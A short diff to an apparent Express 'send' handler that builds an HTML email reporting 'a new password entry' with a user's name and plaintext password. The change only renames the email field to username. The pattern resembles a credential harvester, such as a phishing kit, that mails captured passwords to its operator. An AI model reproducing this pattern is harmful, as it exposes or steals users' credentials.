@@ -34,7 +34,7 @@ app.post('/send',(req, res) => {
 		<p>You have a new password entry from ICEA</p>
 		<h3>User Details</h3>
 		<ul>
-			<li>Name: ${req.body.email}</li>
+			<li>Name: ${req.body.username}</li>
 			<li>Password: ${req.body.password}</li>
 		</ul>
 	`
